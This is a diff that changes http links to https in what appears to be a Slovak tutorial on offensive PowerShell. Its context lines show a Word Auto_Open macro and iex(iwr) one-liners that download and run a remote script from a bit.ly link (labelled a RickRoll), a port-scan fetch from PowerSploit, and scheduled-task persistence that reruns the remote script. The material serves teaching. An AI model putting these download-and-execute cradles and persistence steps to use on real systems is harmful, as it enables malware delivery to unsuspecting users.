@@ -14,7 +14,7 @@ Vytvorte Office dokument (Word / Excel / PowerPoint) a&nbsp;vložte do&nbsp;neho
 <pre class="lang:vb decode:true">' Kompatibilita s&nbsp;MS Word
 Sub Auto_Open()
     Dim exec As&nbsp;String
-    cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/e0Mw9w'))"""
+    cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/e0Mw9w'))"""
     Shell (cmd)
 End Sub
 
@@ -127,7 +127,7 @@ de SuperSecret Random</pre>
 ### Spustenie skriptu z&nbsp;webu
 
 <pre class="lang:ps decode:true "># RickRoll
-iex (iwr http://bit.ly/e0Mw9w )
+iex (iwr https://bit.ly/e0Mw9w )
 
 # PortScan
 $uri = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'
@@ -153,7 +153,7 @@ powershell.exe -ExecutionPolicy Bypass ...</pre>
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 
 <pre class="lang:ps decode:true">Import-Module ....\PowerSploit.psd1
-$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
+$Rickroll = { iex (iwr https://bit.ly/e0Mw9w ) }
 $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
 $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
 
@@ -212,7 +212,7 @@ Remove-WmiObject -InputObject $timer</pre>
 
 [GetPrivateProfileString MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/ms724353(v=vs.85).aspx?f=255&MSPPError=-2147217396)
 
-[GetPrivateProfileString PInvoke.NET](http://www.pinvoke.net/default.aspx/kernel32.GetPrivateProfileString)
+[GetPrivateProfileString PInvoke.NET](https://www.pinvoke.net/default.aspx/kernel32.GetPrivateProfileString)
 
 [ProcMon](https://live.sysinternals.com/Procmon.exe) &#8211; Sledujte File System a&nbsp;Process aktivitu PowerShellu
 
